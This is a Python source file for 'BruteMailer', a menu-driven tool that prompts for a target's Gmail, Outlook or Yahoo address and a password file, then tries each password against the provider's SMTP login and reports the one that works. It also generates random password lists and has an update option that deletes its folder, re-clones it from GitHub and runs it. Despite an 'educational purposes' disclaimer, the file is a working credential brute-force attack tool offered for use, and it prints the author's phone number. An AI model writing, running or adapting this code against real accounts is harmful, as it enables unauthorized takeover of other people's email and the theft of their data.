import smtplib
import time
import os
import sys
import string
import random
import secrets
import pathlib
import colorama
colorama.init()
GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET
YELLOW = colorama.Fore.YELLOW
BLUE = colorama.Fore.BLUE
lb = colorama.Fore.LIGHTBLUE_EX
lr = colorama.Fore.LIGHTRED_EX
RED = colorama.Fore.RED

print(lr)
print("WARNING: BRUTEMAILER WAS CREATED BY I,SOLOMON ADENUGA FOR EDUCATIONAL PURPOSES AND I WON'T BE RESPONSIBLE FOR ANY MISUSE OF THE TOOL")
print("\n")
print(f"{GREEN}[+] TURN ON MOBILE DATA CONNECTION OR WIFI")
print("\n")
print(f"Loading.....{RESET}")
time.sleep(7)

def brute_mailer(domain, pass_file, email):
        if not pass_file.endswith(".txt"):
                pass_file += ".txt"
        server = smtplib.SMTP(host=domain, port=587)
        server.starttls()

        with open(pass_file, "r") as file:
                passwords = file.readlines()
                for password in passwords:
                        try:
                                server.login(email, password)
                                print(GREEN)
                                print("[✓] LOGGED IN SUCCESSFULLY!")
                                print(f"[✓] CORRECT PASSWORD : {password}")
                                print(RESET)
                                break
                        except smtplib.SMTPAuthenticationError:
                                print(RED)
                                print(f"[x] INCORRECT PASSWORD: {password}")
                                print(RESET)
                time.sleep(4)
                print(lb)
                print("Thanks for using BruteMailer,don't forget to follow me on github(SoloTech01) for more awesome tools...")
                print(RESET)
                print("\n")
                time.sleep(4)
                print(GREEN)
                res = input(f"Do you want to continue (y/n){RESET}: ")
                if res.lower().strip() == "y":
                        program_intro()
                elif res.lower().strip() == "n":
                        print(RED)
                        print("TERMINATING....")
                        print(RESET)
                        time.sleep(3)
                        sys.exit()

def gmail():
        os.system("clear")
        print(GREEN)
        print("""
____             _       __  __       _ _
| __ ) _ __ _   _| |_ ___|  \/  | __ _(_) | ___ _ __
|  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
| |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
|____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|

""")
        domain = "smtp.gmail.com"
        gmail_address = input(f"{YELLOW}Enter your target's gmail address:{RESET} ")

        if not gmail_address.endswith("@gmail.com"):
                print("\n")
                print(RED)
                print("Enter a valid Gmail address!")
                print(RESET)
                time.sleep(2)
                program_intro()
        print("\n")
        print(GREEN)
        print("\n")
        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
        path = pathlib.Path(pass_file)
        if path.exists():
                print("\n")
                print(GREEN)
                print(f"Initializing bruteforce attack on {gmail_address}......")
                time.sleep(3)
                print(RESET)
                brute_mailer(domain, pass_file, gmail_address)
        else:
                print(f"{RED}Error: File not found!{RESET}")
                time.sleep(4)
                program_intro()

def outlook():
        os.system("clear")
        print(GREEN)
        print("""
____             _       __  __       _ _
| __ ) _ __ _   _| |_ ___|  \/  | __ _(_) | ___ _ __
|  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
| |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
|____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|

""")
        domain = "smtp.office365.com"
        outlook_address = input(f"{YELLOW}Enter your target's outlook mail address:{RESET} ")

        if not outlook_address.endswith("@outlook.com"):
                print("\n")
                print(f"{RED}Enter a valid Outlook mail address!{RESET}")
                time.sleep(2)
                program_intro()
        print("\n")
        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
        path = pathlib.Path(pass_file)
        if path.exists():
                print("\n")
                print(GREEN)
                print(f"Initializing bruteforce attack on {outlook_address}......{RESET}")
                time.sleep(3)
                brute_mailer(domain, pass_file, outlook_address)
        else:
                print(RED)
                print("Error: File not found!")
                print(RESET)
                time.sleep(4)
                program_intro()

def yahoo():
        os.system("clear")
        print(GREEN)
        print("""
____             _       __  __       _ _
| __ ) _ __ _   _| |_ ___|  \/  | __ _(_) | ___ _ __
|  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
| |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
|____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|

""")
        domain = "smtp.mail.yahoo.com"
        yahoo_address = input(f"{YELLOW}Enter your target's yahoo mail address:{RESET} ")
        print("\n")
        if not yahoo_address.endswith("@yahoo.com"):
                print(f"{RED}Enter a valid Yahoo mail address!{RESET}")
                time.sleep(2)
                program_intro()
        print("\n")
        pass_file = input(f"{YELLOW}Enter the path to your password txt file:{RESET} ")
        path = pathlib.Path(pass_file)
        if path.exists():
                print(f"{GREEN}Initializing bruteforce attack on {yahoo_address}......")
                print(RESET)
                time.sleep(3)
                brute_mailer(domain, pass_file, yahoo_address)
        else:
                print(f"{RED}Error: File not found!{RESET}")
                time.sleep(4)
                program_intro()

def pass_gen():
        os.system("clear")
        print(GREEN)
        print("""
____             _       __  __       _ _
| __ ) _ __ _   _| |_ ___|  \/  | __ _(_) | ___ _ __
|  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
| |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
|____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|

""")
        passwords = []
        num_pass = int(input(f"{YELLOW}Enter number of passwords to generate:{RESET} "))
        print("\n")
        length = int(input(f"{YELLOW}Enter length of each password:{RESET} "))
        print("\n")
        print(f"{GREEN}Generating.....{RESET}")
        time.sleep(3)
        for i in range(num_pass):
                passwords.append("".join(  [secrets.choice(string.digits + string.ascii_letters + string.punctuation) for _ in range(length)]))
        pass_file = "\n".join(passwords)
        filename = "passwords_file.txt"
        with open(filename, "w") as file:
                file.write(pass_file)
        print("\n")
        print(f"{GREEN}[✓] The generated passwords have been saved as 'passwords_file.txt' in your curreent working directory{RESET}")
        time.sleep(4)
        print(lb)
        print("Thanks for using BruteMailer,don't forget to follow me on github(SoloTech01) for more awesome tools...")
        print(RESET)
        print("\n")
        time.sleep(4)
        print(GREEN)
        res = input(f"Do you want to continue (y/n){RESET}: ")
        if res.lower().strip() == "y":
                program_intro()
        elif res.lower().strip() == "n":
                print(RED)
                print("TERMINATING....")
                print(RESET)
                time.sleep(3)
                sys.exit()

def program_intro():
        os.system("clear")
        print(GREEN)
        print("""
____             _       __  __       _ _
| __ ) _ __ _   _| |_ ___|  \/  | __ _(_) | ___ _ __
|  _ \| '__| | | | __/ _ \ |\/| |/ _` | | |/ _ \ '__|
| |_) | |  | |_| | ||  __/ |  | | (_| | | |  __/ |
|____/|_|   \__,_|\__\___|_|  |_|\__,_|_|_|\___|_|
""")
        print(f"{'******' * 10} {YELLOW}")
        print("""
[+] Tool name: BruteMailer
[+] Author: Solomon Adenuga
[+] Version: 1.1
[+] Github: https://github.com/SoloTech01
[+] Whatsapp: +2348023710562
""")
        print("******" * 10)
        print(f"{lb}<<<<<<<<<<<<<<<<<SELECT YOUR TARGET'S' EMAIL SERVICE<<<<<<<<<<<<<<<<<")
        print(GREEN)
        print(f"""
[1] Gmail
[2] Outlook
[3] Yahoo
[4] Password Generator
[5] Update the program
[6] Exit the program
""")
        option = input(f"{lb}<<<<<<<<<<<<<<<<<<<<<<<<<<<<<CHOOSE A VALID OPTION>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>{RESET}")
        if option.strip() == "1":
                print(f"{GREEN}Loading.....{RESET}")
                time.sleep(2)
                gmail()
        elif option.strip() == "2":
                print(f"{GREEN}Loading.....{RESET}")
                time.sleep(2)
                outlook()
        elif option.strip() == "3":
                print(f"{GREEN}Loading.....{RESET}")
                time.sleep(2)
                yahoo()
        elif option.strip() == "4":
                print(f"{GREEN}Loading.....{RESET}")
                time.sleep(2)
                pass_gen()
        elif option.strip() == "5":
                print(GREEN)
                print(f"Updating BruteMailer.....{RESET}")
                time.sleep(2)
                os.system("""
                        cd -
                        rm -rf BruteMailer
                        git clone https://github.com/SoloTech01/BruteMailer
                        cd BruteMailer
                        python3 brutemailer.py
                        """)
        elif option.strip() == "6":
                print(f"{RED}TERMINATING.....{RESET}")
                time.sleep(2)
                sys.exit()


program_intro()